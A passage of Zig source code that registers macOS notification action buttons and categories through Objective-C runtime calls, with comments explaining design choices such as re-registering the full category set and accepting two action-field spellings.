    const category_id = notification_actions.categoryId(actions, id_buf);
    if (findCategory(category_id)) return category_id;

    if (category_count >= max_categories) {
        log.warn("too many distinct notification action shapes; posting without buttons", .{});
        return null;
    }

    const UNNotificationAction = macos_mod.getClass("UNNotificationAction");
    const UNNotificationCategory = macos_mod.getClass("UNNotificationCategory");
    const NSArray = macos_mod.getClass("NSArray");
    const NSMutableArray = macos_mod.getClass("NSMutableArray");
    if (@intFromPtr(UNNotificationAction) == 0 or @intFromPtr(UNNotificationCategory) == 0) return null;

    const action_array = macos_mod.msgSend0(macos_mod.msgSend0(NSMutableArray, "alloc"), "init");
    for (actions) |action| {
        const ns_id = nsStringFrom(action.id) orelse return null;
        const ns_label = nsStringFrom(action.label) orelse return null;
        // UNNotificationActionOptionForeground (1<<2): pressing the button
        // brings the app forward. Without it the app is woken in the
        // background and the page — which is where the handler lives — may not
        // be running to hear about it.
        const options: c_ulong = 1 << 2;
        const makeAction = @as(
            *const fn (objc.id, objc.SEL, objc.id, objc.id, c_ulong) callconv(.c) objc.id,
            @ptrCast(&objc.objc_msgSend),
        );
        const un_action = makeAction(
            UNNotificationAction,
            macos_mod.sel("actionWithIdentifier:title:options:"),
            ns_id,
            ns_label,
            options,
        );
        if (@intFromPtr(un_action) == 0) return null;
        _ = macos_mod.msgSend1(action_array, "addObject:", un_action);
    }

    const ns_category_id = nsStringFrom(category_id) orelse return null;
    const empty = macos_mod.msgSend0(NSArray, "array");
    const makeCategory = @as(
        *const fn (objc.id, objc.SEL, objc.id, objc.id, objc.id, c_ulong) callconv(.c) objc.id,
        @ptrCast(&objc.objc_msgSend),
    );
    const category = makeCategory(
        UNNotificationCategory,
        macos_mod.sel("categoryWithIdentifier:actions:intentIdentifiers:options:"),
        ns_category_id,
        action_array,
        empty,
        0,
    );
    if (@intFromPtr(category) == 0) return null;

    categories[category_count] = .{ .used = true, .id = undefined };
    @memcpy(&categories[category_count].id, category_id);
    category_count += 1;

    // Re-register the whole set. `setNotificationCategories:` replaces rather
    // than adds, so posting only the new one would silently unregister the
    // buttons of every notification already on screen.
    if (!reregisterCategories(category)) {
        category_count -= 1;
        categories[category_count] = .{};
        return null;
    }

    return category_id;
}

/// Hand the notification centre every category registered so far.
///
/// `new_category` is included because the Objective-C objects are not retained
/// between calls — the set held by the centre is the only copy, so the rebuild
/// reads it back rather than keeping a parallel list of ids to reconstruct.
fn reregisterCategories(new_category: objc.id) bool {
    const UNUserNotificationCenter = macos_mod.getClass("UNUserNotificationCenter");
    if (@intFromPtr(UNUserNotificationCenter) == 0) return false;
    const center = macos_mod.msgSend0(UNUserNotificationCenter, "currentNotificationCenter");
    if (@intFromPtr(center) == 0) return false;

    const NSMutableSet = macos_mod.getClass("NSMutableSet");
    const set = macos_mod.msgSend0(macos_mod.msgSend0(NSMutableSet, "alloc"), "init");
    if (@intFromPtr(set) == 0) return false;

    if (registered_categories) |existing| {
        _ = macos_mod.msgSend1(set, "unionSet:", existing);
    }
    _ = macos_mod.msgSend1(set, "addObject:", new_category);

    macos_mod.msgSendVoid1(center, "setNotificationCategories:", set);
    registered_categories = set;
    return true;
}

/// The set handed to the notification centre, kept so the next registration
/// can add to it instead of replacing it.
var registered_categories: objc.id = null;

fn nsStringFrom(text: []const u8) ?objc.id {
    var buf: [512]u8 = undefined;
    if (text.len >= buf.len) return null;
    @memcpy(buf[0..text.len], text);
    buf[text.len] = 0;
    const NSString = macos_mod.getClass("NSString");
    const str = macos_mod.msgSend1(NSString, "stringWithUTF8String:", @as([*:0]const u8, @ptrCast(&buf)));
    return if (@intFromPtr(str) == 0) null else str;
}

/// The `actions` array as the page writes it.
///
/// Two spellings, because the TypeScript SDK has published
/// `actions?: [{action, title}]` on `NotificationOptions` since before
/// anything implemented it — the same documented-but-dead shape as the
/// `actionId` this change removes. Deleting it would break code that compiled
/// against a promise craft made; accepting it makes the promise true.
/// `{id, label}` is canonical and wins when both are given.
pub const ActionSpec = struct {
    id: []const u8 = "",
    label: []const u8 = "",
    action: []const u8 = "",
    title: []const u8 = "",

    fn actionId(self: ActionSpec) []const u8 {
        return if (self.id.len > 0) self.id else self.action;
    }

    fn actionLabel(self: ActionSpec) []const u8 {
        return if (self.label.len > 0) self.label else self.title;
    }
};

/// Put the buttons on `content`, if there are any and they are usable.
///
/// Invalid buttons are refused loudly and the notification still goes out
/// without them. The alternative — dropping the notification because a label
/// was empty — loses the message the app was actually trying to send.
fn applyActions(content: objc.id, specs: []const ActionSpec) void {
    if (specs.len == 0) return;

    var actions: [notification_actions.max_actions]notification_actions.Action = undefined;
    if (specs.len > actions.len) {
        log.warn(
            "notification declared {d} actions; macOS shows {d}, so the rest are ignored",
            .{ specs.len, notification_actions.max_actions },
        );
    }
    const count = @min(specs.len, actions.len);
    for (specs[0..count], 0..) |spec, i| {
        actions[i] = .{ .id = spec.actionId(), .label = spec.actionLabel() };
    }

    notification_actions.validate(actions[0..count]) catch |err| {
        log.warn("notification actions refused ({s}); posting without buttons", .{@errorName(err)});
        return;
    };

    var id_buf: [notification_actions.category_id_len]u8 = undefined;
    const category_id = ensureCategory(actions[0..count], &id_buf) orelse return;
    const ns_category = nsStringFrom(category_id) orelse return;
    _ = macos_mod.msgSend1(content, "setCategoryIdentifier:", ns_category);
}
